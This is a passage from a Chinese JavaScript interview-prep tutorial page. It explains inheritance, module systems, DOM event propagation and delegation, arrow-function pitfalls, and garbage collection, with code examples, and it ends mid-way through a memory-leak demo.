<span class="token class-name">Child</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">,</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">constructor</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">value</span><span class="token operator">:</span> Child<span class="token punctuation">,</span>
    <span class="token literal-property property">enumerable</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">writable</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token literal-property property">configurable</span><span class="token operator">:</span> <span class="token boolean">true</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> child <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

child<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 1</span>
child <span class="token keyword">instanceof</span> <span class="token class-name">Parent</span> <span class="token comment">// true</span>
</code></pre></div><blockquote><p>以上继承实现的核心就是将父类的原型赋值给了子类，并且将构造函数设置为子类，这样既解决了无用的父类属性问题，还能正确的找到子类的构造函数。</p></blockquote> <p><strong>Class 继承</strong></p> <blockquote><p>以上两种继承方式都是通过原型去解决的，在 <code>ES6</code> 中，我们可以使用 <code>class</code> 去实现继承，并且实现起来很简单</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>val <span class="token operator">=</span> value
  <span class="token punctuation">}</span>
  <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>val<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Child</span> <span class="token keyword">extends</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>val <span class="token operator">=</span> value
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> child <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
child<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 1</span>
child <span class="token keyword">instanceof</span> <span class="token class-name">Parent</span> <span class="token comment">// true</span>
</code></pre></div><blockquote><p><code>class</code> 实现继承的核心在于使用 <code>extends</code> 表明继承自哪个父类，并且在子类构造函数中必须调用 <code>super</code>，因为这段代码可以看成 <code>Parent.call(this, value)</code>。</p></blockquote> <h3 id="模块化"><a href="#模块化" class="header-anchor">#</a> 模块化</h3> <p>模块化</p> <blockquote><p>涉及面试题：为什么要使用模块化？都有哪几种方式可以实现模块化，各有什么特点？</p></blockquote> <p>使用一个技术肯定是有原因的，那么使用模块化可以给我们带来以下好处</p> <ul><li>解决命名冲突</li> <li>提供复用性</li> <li>提高代码可维护性</li></ul> <p><strong>立即执行函数</strong></p> <blockquote><p>在早期，使用立即执行函数实现模块化是常见的手段，通过函数作用域解决了命名冲突、污染全局作用域的问题</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">globalVariable</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   globalVariable<span class="token punctuation">.</span><span class="token function-variable function">test</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
   <span class="token comment">// ... 声明各种变量、函数都不会污染全局作用域</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>globalVariable<span class="token punctuation">)</span>
</code></pre></div><p><strong>AMD 和 CMD</strong></p> <blockquote><p>鉴于目前这两种实现方式已经很少见到，所以不再对具体特性细聊，只需要了解这两者是如何使用的。</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// AMD</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./a'</span><span class="token punctuation">,</span> <span class="token string">'./b'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 加载模块完毕可以使用</span>
  a<span class="token punctuation">.</span><span class="token function">do</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  b<span class="token punctuation">.</span><span class="token function">do</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// CMD</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">require<span class="token punctuation">,</span> exports<span class="token punctuation">,</span> module</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 加载模块</span>
  <span class="token comment">// 可以把 require 写在函数体的任意地方实现延迟加载</span>
  <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./a'</span><span class="token punctuation">)</span>
  a<span class="token punctuation">.</span><span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>CommonJS</strong></p> <blockquote><p><code>CommonJS</code> 最早是 <code>Node</code> 在使用，目前也仍然广泛使用，比如在 <code>Webpack</code> 中你就能见到它，当然目前在 <code>Node</code> 中的模块管理已经和 <code>CommonJS</code>有一些区别了</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// a.js</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span>
<span class="token punctuation">}</span>
<span class="token comment">// or</span>
exports<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span>

<span class="token comment">// b.js</span>
<span class="token keyword">var</span> module <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./a.js'</span><span class="token punctuation">)</span>
module<span class="token punctuation">.</span>a <span class="token comment">// -&gt; log 1</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code>ar module <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./a.js'</span><span class="token punctuation">)</span>
module<span class="token punctuation">.</span>a
<span class="token comment">// 这里其实就是包装了一层立即执行函数，这样就不会污染全局变量了，</span>
<span class="token comment">// 重要的是 module 这里，module 是 Node 独有的一个变量</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span>
<span class="token punctuation">}</span>
<span class="token comment">// module 基本实现</span>
<span class="token keyword">var</span> module <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">'xxxx'</span><span class="token punctuation">,</span> <span class="token comment">// 我总得知道怎么去找到他吧</span>
  <span class="token literal-property property">exports</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">// exports 就是个空对象</span>
<span class="token punctuation">}</span>
<span class="token comment">// 这个是为什么 exports 和 module.exports 用法相似的原因</span>
<span class="token keyword">var</span> exports <span class="token operator">=</span> module<span class="token punctuation">.</span>exports
<span class="token keyword">var</span> <span class="token function-variable function">load</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">module</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 导出的东西</span>
    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span>
    module<span class="token punctuation">.</span>exports <span class="token operator">=</span> a
    <span class="token keyword">return</span> module<span class="token punctuation">.</span>exports
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">// 然后当我 require 的时候去找到独特的</span>
<span class="token comment">// id，然后将要使用的东西用立即执行函数包装下，over</span>
</code></pre></div><blockquote><p>另外虽然 <code>exports</code> 和 <code>module.exports</code> 用法相似，但是不能对 <code>exports</code> 直接赋值。因为 <code>var exports = module.exports</code> 这句代码表明了 <code>exports</code> 和 <code>module.exports</code>享有相同地址，通过改变对象的属性值会对两者都起效，但是如果直接对 <code>exports</code> 赋值就会导致两者不再指向同一个内存地址，修改并不会对 <code>module.exports</code> 起效</p></blockquote> <p><strong>ES Module</strong></p> <blockquote><p><code>ES Module</code> 是原生实现的模块化方案，与 <code>CommonJS</code> 有以下几个区别</p></blockquote> <ol><li><code>CommonJS</code> 支持动态导入，也就是 <code>require(${path}/xx.js)</code>，后者目前不支持，但是已有提案</li> <li><code>CommonJS</code> 是同步导入，因为用于服务端，文件都在本地，同步导入即使卡住主线程影响也不大。而后者是异步导入，因为用于浏览器，需要下载文件，如果也采用同步导入会对渲染有很大影响</li> <li><code>CommonJS</code> 在导出时都是值拷贝，就算导出的值变了，导入的值也不会改变，所以如果想更新值，必须重新导入一次。但是 <code>ES Module</code> 采用实时绑定的方式，导入导出的值都指向同一个内存地址，所以导入值会跟随导出值变化</li> <li><code>ES Module</code> 会编译成 <code>require/exports</code>来执行的</li></ol> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 引入模块 API</span>
<span class="token keyword">import</span> <span class="token constant">XXX</span> <span class="token keyword">from</span> <span class="token string">'./a.js'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">XXX</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./a.js'</span>
<span class="token comment">// 导出模块 API</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre></div><h3 id="事件机制"><a href="#事件机制" class="header-anchor">#</a> 事件机制</h3> <blockquote><p>涉及面试题：事件的触发过程是怎么样的？知道什么是事件代理嘛？</p></blockquote> <p><strong>1. 事件触发三阶段</strong></p> <p><strong>事件触发有三个阶段</strong>：</p> <ul><li><code>window</code>往事件触发处传播，遇到注册的捕获事件会触发</li> <li>传播到事件触发处时触发注册的事件</li> <li>从事件触发处往 <code>window</code> 传播，遇到注册的冒泡事件会触发</li></ul> <blockquote><p>事件触发一般来说会按照上面的顺序进行，但是也有特例，如果给一个 <code>body</code> 中的子节点同时注册冒泡和捕获事件，事件触发会按照注册的顺序执行</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 以下会先打印冒泡然后是捕获</span>
node<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>
  <span class="token string">'click'</span><span class="token punctuation">,</span>
  <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'冒泡'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token boolean">false</span>
<span class="token punctuation">)</span>
node<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>
  <span class="token string">'click'</span><span class="token punctuation">,</span>
  <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'捕获 '</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token boolean">true</span>
<span class="token punctuation">)</span>
</code></pre></div><p><strong>2. 注册事件</strong></p> <blockquote><p>通常我们使用 <code>addEventListener</code> 注册事件，该函数的第三个参数可以是布尔值，也可以是对象。对于布尔值 <code>useCapture</code> 参数来说，该参数默认值为 <code>false</code> ，<code>useCapture</code> 决定了注册的事件是捕获事件还是冒泡事件。对于对象参数来说，可以使用以下几个属性</p></blockquote> <ul><li><code>capture</code>：布尔值，和 <code>useCapture</code> 作用一样</li> <li><code>once</code>：布尔值，值为 <code>true</code> 表示该回调只会调用一次，调用后会移除监听</li> <li><code>passive</code>：布尔值，表示永远不会调用 <code>preventDefault</code></li></ul> <blockquote><p>一般来说，如果我们只希望事件只触发在目标上，这时候可以使用 <code>stopPropagation</code>来阻止事件的进一步传播。通常我们认为 <code>stopPropagation</code> 是用来阻止事件冒泡的，其实该函数也可以阻止捕获事件。<code>stopImmediatePropagation</code> 同样也能实现阻止事件，但是还能阻止该事件目标执行别的注册事件。</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code>node<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>
  <span class="token string">'click'</span><span class="token punctuation">,</span>
  <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span><span class="token function">stopImmediatePropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'冒泡'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token boolean">false</span>
<span class="token punctuation">)</span>
<span class="token comment">// 点击 node 只会执行上面的函数，该函数不会执行</span>
node<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>
  <span class="token string">'click'</span><span class="token punctuation">,</span>
  <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'捕获 '</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token boolean">true</span>
<span class="token punctuation">)</span>
</code></pre></div><p><strong>3. 事件代理</strong></p> <blockquote><p>如果一个节点中的子节点是动态生成的，那么子节点需要注册事件的话应该注册在父节点上</p></blockquote> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>ul<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
	<span class="token keyword">let</span> ul <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#ul'</span><span class="token punctuation">)</span>
	ul<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
		console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>事件代理的方式相较于直接给目标注册事件来说，有以下优点</strong>：</p> <ul><li>节省内存</li> <li>不需要给子节点注销事件</li></ul> <h3 id="箭头函数"><a href="#箭头函数" class="header-anchor">#</a> 箭头函数</h3> <ul><li>箭头函数不绑定 <code>arguments</code>，可以使用 <code>...args</code> 代替</li> <li>箭头函数没有 <code>prototype</code> 属性，不能进行 <code>new</code> 实例化</li> <li>箭头函数不能通过 <code>call</code>、<code>apply</code> 等绑定 <code>this</code>，因为箭头函数底层是使用<code>bind</code>永久绑定<code>this</code>了，<code>bind</code>绑定过的<code>this</code>不能修改</li> <li>箭头函数的<code>this</code>指向创建时父级的<code>this</code></li> <li>箭头函数不能使用<code>yield</code>关键字，不能作为<code>Generator</code>函数</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">fn1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token comment">// 箭头函数中没有arguments</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'arguments'</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token function">fn1</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> <span class="token function-variable function">fn2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token comment">// 这里的this指向window，箭头函数的this指向创建时父级的this</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'this'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token comment">// 箭头函数不能修改this</span>
<span class="token function">fn2</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">100</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'poetry'</span><span class="token punctuation">,</span>
  <span class="token function">getName2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 这里的this指向obj</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token comment">// 这里的this指向obj</span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function-variable function">getName</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">// 1、不适用箭头函数的场景1：对象方法</span>
    <span class="token comment">// 这里不能使用箭头函数，否则箭头函数指向window</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

obj<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">getName3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">// 2、不适用箭头函数的场景2：对象原型</span>
  <span class="token comment">// 这里不能使用箭头函数，否则this指向window</span>
  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name
<span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token function-variable function">Foo</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">// 3、不适用箭头函数的场景3：构造函数</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name
<span class="token punctuation">}</span>
<span class="token keyword">const</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token string">'poetry'</span><span class="token punctuation">)</span> <span class="token comment">// 箭头函数没有 prototype 属性，不能进行 new 实例化</span>

<span class="token keyword">const</span> btn1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span>
btn1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span> <span class="token comment">// 4、不适用箭头函数的场景4：动态上下文的回调函数</span>
  <span class="token comment">// 这里不能使用箭头函数 this === window</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'click'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// Vue 组件本质上是一个 JS 对象，this需要指向组件实例</span>
<span class="token comment">// vue的生命周期和method不能使用箭头函数</span>
<span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'poetry'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// 5、不适用箭头函数的场景5：vue的生命周期和method</span>
    <span class="token function-variable function">getName</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token comment">// 这里不能使用箭头函数，否则this指向window</span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function-variable function">mounted</span><span class="token operator">:</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 这里不能使用箭头函数，否则this指向window</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// React 组件（非 Hooks）它本质上是一个 ES6 class</span>
<span class="token keyword">class</span> <span class="token class-name">Foo</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name
  <span class="token punctuation">}</span>
  <span class="token function-variable function">getName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">// 这里的箭头函数this指向实例本身没有问题的</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token string">'poetry'</span><span class="token punctuation">)</span> 
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
</code></pre></div><p><strong>总结：不适用箭头函数的场景</strong></p> <ul><li>场景1：对象方法</li> <li>场景2：对象原型</li> <li>场景3：构造函数</li> <li>场景4：动态上下文的回调函数</li> <li>场景5：vue的生命周期和<code>method</code></li></ul> <h3 id="js内存泄露如何检测-场景有哪些"><a href="#js内存泄露如何检测-场景有哪些" class="header-anchor">#</a> JS内存泄露如何检测？场景有哪些？</h3> <p><strong>内存泄漏</strong>：当一个对象不再被使用，但是由于某种原因，它的内存没有被释放，这就是内存泄漏。</p> <p><strong>1. 垃圾回收机制</strong></p> <ul><li>对于在JavaScript中的字符串，对象，数组是没有固定大小的，只有当对他们进行动态分配存储时，解释器就会分配内存来存储这些数据，当JavaScript的解释器消耗完系统中所有可用的内存时，就会造成系统崩溃。</li> <li>内存泄漏，在某些情况下，不再使用到的变量所占用内存没有及时释放，导致程序运行中，内存越占越大，极端情况下可以导致系统崩溃，服务器宕机。</li> <li>JavaScript有自己的一套垃圾回收机制，JavaScript的解释器可以检测到什么时候程序不再使用这个对象了（数据），就会把它所占用的内存释放掉。</li> <li>针对JavaScript的垃圾回收机制有以下两种方法（常用）：标记清除（现代），引用计数（之前）</li></ul> <p><strong>有两种垃圾回收策略：</strong></p> <ul><li><strong>标记清除</strong>：标记阶段即为所有活动对象做上标记，清除阶段则把没有标记（也就是非活动对象）销毁。</li> <li><strong>引用计数</strong>：它把对象是否不再需要简化定义为对象有没有其他对象引用到它。如果没有引用指向该对象（引用计数为 <code>0</code>），对象将被垃圾回收机制回收</li></ul> <p><strong>标记清除的缺点：</strong></p> <ul><li><strong>内存碎片化</strong>，空闲内存块是不连续的，容易出现很多空闲内存块，还可能会出现分配所需内存过大的对象时找不到合适的块。</li> <li><strong>分配速度慢</strong>，因为即便是使用 <code>First-fit</code> 策略，其操作仍是一个 <code>O(n)</code> 的操作，最坏情况是每次都要遍历到最后，同时因为碎片化，大对象的分配效率会更慢。</li></ul> <blockquote><p>解决以上的缺点可以使用 <strong>标记整理（Mark-Compact）算法</strong> 标记结束后，标记整理算法会将活着的对象（即不需要清理的对象）向内存的一端移动，最后清理掉边界的内存（如下图）</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/08/9ab816979f615b6e.png" loading="lazy" class="lazy"></p> <p><strong>引用计数的缺点：</strong></p> <ul><li>需要一个计数器，所占内存空间大，因为我们也不知道被引用数量的上限。</li> <li><code>解决不了循环引用导致的无法回收问题</code> <ul><li><code>IE 6、7</code>，<code>JS</code>对象和<code>DOM</code>对象循环引用，清除不了，导致内存泄露</li></ul></li></ul> <blockquote><p><code>V8</code> 的垃圾回收机制也是基于标记清除算法，不过对其做了一些优化。</p></blockquote> <ul><li>针对新生区采用并行回收。</li> <li>针对老生区采用增量标记与惰性回收</li></ul> <blockquote><p><strong>注意</strong>：<code>闭包不是内存泄露，闭包的数据是不可以被回收的</code></p></blockquote> <p><strong>拓展：WeakMap、WeakMap的作用</strong></p> <ul><li>作用是<code>防止内存泄露的</code></li> <li><code>WeakMap</code>、<code>WeakMap</code>的应用场景
<ul><li>想临时记录数据或关系</li> <li>在<code>vue3</code>中大量使用了<code>WeakMap</code></li></ul></li> <li><code>WeakMap</code>的<code>key</code>只能是对象，不能是基本类型</li></ul> <p><strong>2. 如何检测内存泄露</strong></p> <p>内存泄露模拟</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
  memory change
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>start<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
